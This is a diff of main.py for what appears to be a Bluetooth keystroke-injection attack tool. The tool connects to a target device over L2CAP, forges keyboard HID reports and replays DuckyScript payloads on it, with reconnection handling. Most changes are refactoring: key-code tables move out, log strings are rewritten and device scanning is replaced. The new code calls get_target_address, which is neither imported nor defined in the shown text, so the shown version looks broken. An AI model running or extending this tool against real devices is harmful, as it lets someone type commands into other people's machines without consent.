@@ -1,3 +1,5 @@
+# main.py
+
 import binascii
 import bluetooth
 import sys
@@ -11,8 +13,9 @@ from enum import Enum
 import subprocess
 import os
 
-from utils.menu_functions import (read_duckyscript, run, restart_bluetooth_daemon)
+from utils.menu_functions import (read_duckyscript, run, restart_bluetooth_daemon, scan_for_devices, main_menu, is_valid_mac_address)
 from utils.register_device import register_hid_profile, agent_loop
+from utils.key_codes import Key_Codes, Modifier_Codes
 
 child_processes = []
 
@@ -168,6 +171,7 @@ class L2CAPClient:
         self.connected = False
         self.sock = None
 
+    @staticmethod
     def encode_keyboard_input(*args):
         keycodes = []
         flags = 0
@@ -178,7 +182,7 @@ class L2CAPClient:
                 flags |= a.value
         assert(len(keycodes) <= 7)
         keycodes += [0] * (7 - len(keycodes))
-        report = bytes([0xa1, 0x01, flags, 0x00] + keycodes)
+        report = bytes([0xA1, 0x01, flags, 0x00] + keycodes)
         return report
 
     def close(self):
@@ -242,7 +246,7 @@ class L2CAPClient:
 
     def connect(self, timeout=None):
         log.debug(f"Attempting to connect to {self.addr} on port {self.port}")
-        log.info("connecting to %s on port %d" % (self.addr, self.port))
+        log.info(f"Connecting to {self.addr} on port {self.port}")
         sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
         sock.settimeout(timeout)
         try:
@@ -250,17 +254,17 @@ class L2CAPClient:
             sock.setblocking(0)
             self.sock = sock
             self.connected = True
-            log.debug("SUCCESS! connected on port %d" % self.port)
+            log.debug(f"SUCCESS! Connected on port {self.port}")
         except Exception as ex:
             red = "\033[91m"
             blue = "\033[94m"
             reset = "\033[0m"
             error = True
             self.connected = False
-            log.error("ERROR connecting on port %d: %s" % (self.port, ex))
+            log.error(f"ERROR connecting on port {self.port}: {ex}")
             raise ConnectionFailureException(f"Connection failure on port {self.port}")
-            if (error == True & self.port == 14):
-                print(f"{reset}[{red}!{reset}] {red}CRITICAL ERROR{reset}: {reset}Attempted Connection to {red}{self.addr} {reset}was {red}denied{reset}.")
+            if (error and self.port == 14):
+                print(f"{reset}[{red}!{reset}] {red}CRITICAL ERROR{reset}: Attempted Connection to {red}{self.addr} {reset}was {red}denied{reset}.")
                 return self.connected
         return self.connected
 
@@ -300,15 +304,21 @@ def process_duckyscript(client, duckyscript, current_line=0, current_position=0)
             else:
                 current_position = 0
             line = line.strip()
-            log.info(f"Processing {line}")
+            log.info(f"Processing: {line}")
             if not line or line.startswith("REM"):
                 continue
             if line.startswith("TAB"):
                 client.send_keypress(Key_Codes.TAB)
             if line.startswith("PRIVATE_BROWSER"):
-                report = bytes([0xa1, 0x01, Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 0x00, Key_Codes.n.value, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+                report = bytes([
+                    0xA1, 0x01, 
+                    Modifier_Codes.CTRL.value | Modifier_Codes.SHIFT.value, 
+                    0x00, 
+                    Key_Codes.n.value, 
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
+                ])
                 client.send(report)
-                release_report = bytes([0xa1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
+                release_report = bytes([0xA1, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00])
                 client.send(release_report)
             if line.startswith("VOLUME_UP"):
                 hid_report_gui_v = bytes.fromhex("a1010800190000000000")
@@ -454,98 +464,6 @@ def char_to_key_code(char):
     }
     return shift_char_map.get(char)
 
-class Modifier_Codes(Enum):
-    CTRL = 0x01
-    RIGHTCTRL = 0x10
-    SHIFT = 0x02
-    RIGHTSHIFT = 0x20
-    ALT = 0x04
-    RIGHTALT = 0x40
-    GUI = 0x08
-    WINDOWS = 0x08
-    COMMAND = 0x08
-    RIGHTGUI = 0x80
-
-class Key_Codes(Enum):
-    NONE = 0x00
-    a = 0x04
-    b = 0x05
-    c = 0x06
-    d = 0x07
-    e = 0x08
-    f = 0x09
-    g = 0x0a
-    h = 0x0b
-    i = 0x0c
-    j = 0x0d
-    k = 0x0e
-    l = 0x0f
-    m = 0x10
-    n = 0x11
-    o = 0x12
-    p = 0x13
-    q = 0x14
-    r = 0x15
-    s = 0x16
-    t = 0x17
-    u = 0x18
-    v = 0x19
-    w = 0x1a
-    x = 0x1b
-    y = 0x1c
-    z = 0x1d
-    _1 = 0x1e
-    _2 = 0x1f
-    _3 = 0x20
-    _4 = 0x21
-    _5 = 0x22
-    _6 = 0x23
-    _7 = 0x24
-    _8 = 0x25
-    _9 = 0x26
-    _0 = 0x27
-    ENTER = 0x28
-    ESCAPE = 0x29
-    BACKSPACE = 0x2a
-    TAB = 0x2b
-    SPACE = 0x2c
-    MINUS = 0x2d
-    EQUAL = 0x2e
-    LEFTBRACE = 0x2f
-    RIGHTBRACE = 0x30
-    CAPSLOCK = 0x39
-    VOLUME_UP = 0x3b
-    VOLUME_DOWN = 0xee
-    SEMICOLON = 0x33
-    COMMA = 0x36
-    PERIOD = 0x37
-    SLASH = 0x38
-    PIPE = 0x31
-    BACKSLASH = 0x31
-    GRAVE = 0x35
-    APOSTROPHE = 0x34
-    LEFT_BRACKET = 0x2f
-    RIGHT_BRACKET = 0x30
-    DOT = 0x37
-    RIGHT = 0x4f
-    LEFT = 0x50
-    DOWN = 0x51
-    UP = 0x52
-    EXCLAMATION_MARK = 0x1e
-    AT_SYMBOL = 0x1f
-    HASHTAG = 0x20
-    DOLLAR = 0x21
-    PERCENT_SYMBOL = 0x22
-    CARET_SYMBOL = 0x23
-    AMPERSAND_SYMBOL = 0x24
-    ASTERISK_SYMBOL = 0x25
-    OPEN_PARENTHESIS = 0x26
-    CLOSE_PARENTHESIS = 0x27
-    UNDERSCORE_SYMBOL = 0x2d
-    QUOTE = 0x34
-    QUESTIONMARK = 0x38
-    KEYPADPLUS = 0x57
-
 def terminate_child_processes():
     for proc in child_processes:
         if proc.is_alive():
@@ -602,21 +520,6 @@ def troubleshoot_bluetooth():
         return False
     return True
 
-def scan_devices(scan_time=10):
-    print("Scanning for Bluetooth devices...")
-    try:
-        devices = bluetooth.discover_devices(duration=scan_time, lookup_names=True, flush_cache=True, lookup_class=True)
-        if not devices:
-            print("No devices found. Please make sure the target devices are discoverable.")
-            return []
-        print(f"Found {len(devices)} devices:")
-        for idx, (addr, name, dev_class) in enumerate(devices, 1):
-            print(f"{idx}. {name} [{addr}] - Class: {dev_class}")
-        return devices
-    except Exception as e:
-        log.error(f"Error during scanning: {e}")
-        return []
-
 def main():
     blue = "\033[0m"
     red = "\033[91m"
@@ -628,30 +531,11 @@ def main():
 
     main_menu()
 
-    # Enhanced Scanning Functionality
-    devices = scan_devices(scan_time=15)  # Increase scan time for better discovery
-    if not devices:
-        log.info("No devices found during scan. Exiting.")
+    # Get target address using updated menu_functions.py
+    target_address = get_target_address()
+    if not target_address:
+        log.info("No target address provided. Exiting..")
         return
-
-    while True:
-        try:
-            choice = input(f"\nEnter the number of the target device (1-{len(devices)}) or 'r' to rescan: ").strip()
-            if choice.lower() == 'r':
-                devices = scan_devices(scan_time=15)
-                if not devices:
-                    log.info("No devices found during scan. Exiting.")
-                    return
-                continue
-            device_index = int(choice) - 1
-            if 0 <= device_index < len(devices):
-                target_address = devices[device_index][0]
-                print(f"Selected target device: {devices[device_index][1]} [{target_address}]")
-                break
-            else:
-                print("Invalid selection. Please try again.")
-        except ValueError:
-            print("Invalid input. Please enter a valid number or 'r' to rescan.")
 
     script_directory = os.path.dirname(os.path.realpath(__file__))
     payload_folder = os.path.join(script_directory, 'payloads/')
@@ -665,11 +549,11 @@ def main():
         print(f"{red}No payloads found in the payloads folder. Exiting.{reset}")
         return
 
-    print(f"\nAvailable payloads{blue}:")
+    print(f"\nAvailable payloads\033[94m:")
     for idx, payload_file in enumerate(payloads, 1):
-        print(f"{reset}[{blue}{idx}{reset}]{blue}: {blue}{payload_file}")
+        print(f"{reset}[{blue}{idx}{reset}]\033[94m: {reset}{payload_file}")
 
-    payload_choice = input(f"\n{blue}Enter the number that represents the payload you would like to load{reset}: {blue}")
+    payload_choice = input(f"\n\033[94mEnter the number that represents the payload you would like to load\033[0m: \033[94m")
     selected_payload = None
     try:
         payload_index = int(payload_choice) - 1
@@ -678,10 +562,10 @@ def main():
         print(f"Invalid payload choice. No payload selected.")
 
     if selected_payload is not None:
-        print(f"{blue}Selected payload{reset}: {blue}{selected_payload}")
+        print(f"\033[94mSelected payload\033[0m: \033[94m{selected_payload}\033[0m")
         duckyscript = read_duckyscript(selected_payload)
     else:
-        print(f"{red}No payload selected.")
+        print(f"\033[91mNo payload selected.\033[0m")
         duckyscript = None
 
     if not duckyscript:
@@ -702,7 +586,7 @@ def main():
             time.sleep(2)
             break
         except ReconnectionRequiredException as e:
-            log.info(f"{reset}Reconnection required. Attempting to reconnect{blue}...")
+            log.info(f"\033[0mReconnection required. Attempting to reconnect\033[94m...")
             current_line = e.current_line
             current_position = e.current_position
             connection_manager.close_all()
